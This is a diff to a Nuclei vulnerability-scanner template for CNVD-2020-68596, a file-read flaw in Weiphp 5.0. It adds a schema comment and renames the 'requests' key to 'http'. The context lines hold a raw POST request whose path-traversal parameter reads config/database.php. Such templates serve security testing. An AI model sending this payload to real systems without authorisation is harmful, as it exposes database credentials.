@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: CNVD-2020-68596
 
 info:
@@ -7,7 +8,7 @@ info:
   reference: http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html
   tags: weiphp,lfi,cnvd,cnvd2020
 
-requests:
+http:
   - raw:
       - |
         POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php HTTP/1.1
